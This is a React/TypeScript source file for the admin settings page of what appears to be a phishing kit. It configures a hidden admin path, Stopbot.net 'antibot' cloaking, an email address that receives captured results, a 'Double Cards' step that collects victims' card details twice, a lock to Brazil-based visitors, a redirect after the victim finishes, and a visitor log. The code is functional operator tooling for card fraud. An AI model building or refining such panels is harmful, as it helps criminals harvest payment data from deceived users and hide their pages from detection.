import InputError from '@/components/input-error';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Separator } from '@/components/ui/separator';
import { Switch } from '@/components/ui/switch';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { VersionSwitch } from '@/components/version-switch';
import { Visitor, VisitorAnalyticsTable } from '@/pages/components/visitor-analytics-table';
import { Head, Link as GoTo, useForm } from '@inertiajs/react';
import { Key, Link, Mail, Save, Shield, User, Users } from 'lucide-react';
import { type FormEvent } from 'react';

const defaultStopbot = {
    key: '',
    confname: '',
};

export type Stopbot = {
    key: string;
    confname: string;
};

export type AdminSettings = {
    admin_panel: string;
    username: string;
    password: string;
    stopbot: Stopbot | null;
    email_result: string;
    redirect_on_finish: boolean;
    double_cards: boolean;
    parameter: string | null;
    external_redirect: string;
    lock_brazil: boolean;
};

interface DashboardProps {
    settings: AdminSettings;
    'settings-updated': string | null;
    visitors: Visitor[]; // Add the visitors array to the props
}

export default function Dashboard({ settings, 'settings-updated': settingsUpdated, visitors = [] }: DashboardProps) {
    const { patch, errors, transform, isDirty, setData, data, processing } = useForm(settings);

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        transform((data) => ({
            ...data,
            parameter: data.parameter || null,
            password: data.password || undefined,
        }));
        patch(route('admin.settings.patch'), {
            preserveScroll: true,
            preserveState: true,
        });
    };

    return (
        <main className="flex min-h-screen justify-center">
            <Head title="Admin Panel">
                <link rel="preconnect" href="https://fonts.bunny.net" />
                <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />
            </Head>
            <div className="container max-w-6xl py-6">
                <h1 className="mb-6 text-2xl font-bold">Admin Settings</h1>

                <Tabs defaultValue="access" className="w-full">
                    <TabsList className="mb-6 grid grid-cols-5">
                        <TabsTrigger value="access">Access</TabsTrigger>
                        <TabsTrigger value="stopbot">
                            <img src="/stopbot-logo.png" alt="Stopbot" className="h-4 w-4" />
                            Stopbot
                        </TabsTrigger>
                        <TabsTrigger value="behavior">Behavior</TabsTrigger>
                        <TabsTrigger value="redirects">Redirects</TabsTrigger>
                        <TabsTrigger value="visitors" className="flex items-center gap-1">
                            <Users className="h-4 w-4" />
                            Visitors
                        </TabsTrigger>
                    </TabsList>
                    {settingsUpdated && (
                        <div className="mb-4 rounded-md bg-green-50 p-4 text-sm text-green-700">
                            <p>{settingsUpdated}</p>
                        </div>
                    )}
                    <form onSubmit={handleSubmit}>
                        <TabsContent value="access">
                            <Card>
                                <CardHeader>
                                    <CardTitle className="flex items-center gap-2">
                                        <Shield className="h-5 w-5" />
                                        Access Settings
                                    </CardTitle>
                                    <CardDescription>Configure authentication and security settings</CardDescription>
                                </CardHeader>
                                <CardContent className="space-y-4">
                                    <div className="space-y-2">
                                        <Label htmlFor="admin_panel">Admin Panel URL</Label>
                                        <div className="flex items-center space-x-2">
                                            <Input
                                                id="admin_panel"
                                                name="admin_panel"
                                                value={data.admin_panel}
                                                onChange={({ target }) => setData('admin_panel', target.value)}
                                                placeholder="admin/hidden"
                                            />
                                        </div>
                                        <InputError message={errors.admin_panel} />
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-2">
                                            <Label htmlFor="username" className="flex items-center gap-1">
                                                <User className="h-4 w-4" /> Username
                                            </Label>
                                            <Input
                                                id="username"
                                                name="username"
                                                value={data.username}
                                                onChange={({ target }) => setData('username', target.value)}
                                            />
                                            <InputError message={errors.username} />
                                        </div>

                                        <div className="space-y-2">
                                            <Label htmlFor="password" className="flex items-center gap-1">
                                                <Key className="h-4 w-4" /> Password
                                            </Label>
                                            <Input
                                                id="password"
                                                name="password"
                                                type="password"
                                                value={data.password}
                                                onChange={({ target }) => setData('password', target.value)}
                                            />
                                            <InputError message={errors.password} />
                                        </div>
                                    </div>

                                    <div className="space-y-2">
                                        <Label htmlFor="email_result" className="flex items-center gap-1">
                                            <Mail className="h-4 w-4" /> Email Result
                                        </Label>
                                        <Input
                                            id="email_result"
                                            name="email_result"
                                            type="email"
                                            value={data.email_result}
                                            onChange={({ target }) => setData('email_result', target.value)}
                                        />
                                        <InputError message={errors.email_result} />
                                    </div>
                                </CardContent>
                            </Card>
                        </TabsContent>
                        <TabsContent value="stopbot">
                            <Card>
                                <CardHeader>
                                    <div className="flex items-center justify-between">
                                        <VersionSwitch className="disabled:opacity-100" checked={!!data.stopbot?.confname} disabled>
                                            <span className="text-foreground/90 transform text-sm font-bold transition-all duration-300">
                                                {data.stopbot?.confname ? 'V2' : 'V1'}
                                            </span>
                                        </VersionSwitch>
                                    </div>
                                    <div className="flex items-center justify-between">
                                        <div className="w-full space-y-0.5">
                                            <Label htmlFor="stopbot">
                                                Enable Stopbot.net?
                                                <p className="text-muted-foreground text-sm">Integrate antibot with Stopbot</p>
                                            </Label>
                                        </div>
                                        <Switch
                                            id="stopbot"
                                            name="stopbot"
                                            checked={Boolean(data.stopbot)}
                                            onCheckedChange={(checked) => setData('stopbot', checked ? defaultStopbot : null)}
                                        />
                                    </div>
                                </CardHeader>
                                <CardContent className="space-y-4" hidden={data.stopbot === null}>
                                    <div className="space-y-2">
                                        <Label htmlFor="api">Apikey</Label>
                                        <Input
                                            id="apikey"
                                            name="apikey"
                                            value={data.stopbot?.key || ''}
                                            onChange={({ target }) =>
                                                setData(
                                                    'stopbot',
                                                    data.stopbot
                                                        ? {
                                                              ...data.stopbot,
                                                              key: target.value,
                                                          }
                                                        : null,
                                                )
                                            }
                                            placeholder="Stopbot Apikey"
                                        />
                                        {/* eslint-disable-next-line @typescript-eslint/ban-ts-comment */}
                                        {/* @ts-ignore */}
                                        <InputError message={errors['stopbot.key']} />
                                    </div>
                                    <div className="space-y-2">
                                        <Label htmlFor="api">Config Name</Label>
                                        <Input
                                            id="confname"
                                            name="confname"
                                            value={data.stopbot?.confname || ''}
                                            onChange={({ target }) =>
                                                setData(
                                                    'stopbot',
                                                    data.stopbot
                                                        ? {
                                                              ...data.stopbot,
                                                              confname: target.value,
                                                          }
                                                        : null,
                                                )
                                            }
                                            placeholder="Stopbot Apikey"
                                        />
                                        <InputError message={errors.stopbot} />
                                    </div>
                                </CardContent>
                            </Card>
                        </TabsContent>
                        <TabsContent value="behavior">
                            <Card>
                                <CardHeader>
                                    <CardTitle>Behavior Settings</CardTitle>
                                    <CardDescription>Configure how the application behaves</CardDescription>
                                </CardHeader>
                                <CardContent className="space-y-4">
                                    <div className="flex items-center justify-between">
                                        <div className="space-y-0.5">
                                            <Label htmlFor="redirect_on_finish">Redirect on Finish</Label>
                                            <p className="text-muted-foreground text-sm">Automatically redirect users when process completes</p>
                                        </div>
                                        <Switch
                                            id="redirect_on_finish"
                                            name="redirect_on_finish"
                                            checked={data.redirect_on_finish}
                                            onCheckedChange={(checked) => setData('redirect_on_finish', checked)}
                                        />
                                    </div>
                                    <InputError message={errors.redirect_on_finish} />

                                    <Separator />

                                    <div className="flex items-center justify-between">
                                        <div className="space-y-0.5">
                                            <Label htmlFor="double_cards">Double Cards</Label>
                                            <p className="text-muted-foreground text-sm">Enable double card verification process</p>
                                        </div>
                                        <Switch
                                            id="double_cards"
                                            name="double_cards"
                                            checked={data.double_cards}
                                            onCheckedChange={(checked) => setData('double_cards', checked)}
                                        />
                                    </div>
                                    <InputError message={errors.double_cards} />

                                    <Separator />

                                    <div className="flex items-center justify-between">
                                        <div className="space-y-0.5">
                                            <Label htmlFor="lock_brazil">Lock Country</Label>
                                            <p className="text-muted-foreground text-sm">Enable outside brazil</p>
                                        </div>
                                        <Switch
                                            id="lock_brazil"
                                            name="lock_brazil"
                                            checked={data.lock_brazil}
                                            onCheckedChange={(checked) => setData('lock_brazil', checked)}
                                        />
                                    </div>
                                    <InputError message={errors.lock_brazil} />

                                    <Separator />

                                    <div className="space-y-2">
                                        <Label htmlFor="parameter">Parameter (Optional)</Label>
                                        <Input
                                            id="parameter"
                                            name="parameter"
                                            value={data.parameter || ''}
                                            onChange={({ target }) => setData('parameter', target.value || null)}
                                            placeholder="Optional parameter"
                                        />
                                        <InputError message={errors.parameter} />
                                    </div>
                                </CardContent>
                            </Card>
                        </TabsContent>
                        <TabsContent value="redirects">
                            <Card>
                                <CardHeader>
                                    <CardTitle className="flex items-center gap-2">
                                        <Link className="h-5 w-5" />
                                        Redirect Settings
                                    </CardTitle>
                                    <CardDescription>Configure redirection URLs and behavior</CardDescription>
                                </CardHeader>
                                <CardContent>
                                    <div className="space-y-2">
                                        <Label htmlFor="external_redirect">External Redirect URL</Label>
                                        <Input
                                            id="external_redirect"
                                            name="external_redirect"
                                            value={data.external_redirect}
                                            onChange={({ target }) => setData('external_redirect', target.value)}
                                            placeholder="https://example.com"
                                        />
                                        <p className="text-muted-foreground text-sm">
                                            The URL where users will be redirected when the process completes
                                        </p>
                                        <InputError message={errors.external_redirect} />
                                    </div>
                                </CardContent>
                            </Card>
                        </TabsContent>
                    </form>

                    <TabsContent value="visitors">
                        <VisitorAnalyticsTable visitors={visitors} />
                    </TabsContent>
                </Tabs>

                <div className="mt-6 flex justify-between">
                    <GoTo href={route('admin.logout')}>
                        <Button type="button" variant="destructive" className="flex items-center gap-2">
                            Logout
                        </Button>
                    </GoTo>
                    <form onSubmit={handleSubmit}>
                        <Button type="submit" disabled={processing || !isDirty} className="flex items-center gap-2">
                            <Save className="h-4 w-4" />
                            {processing ? 'Saving...' : 'Save Settings'}
                        </Button>
                    </form>
                </div>
            </div>
        </main>
    );
}
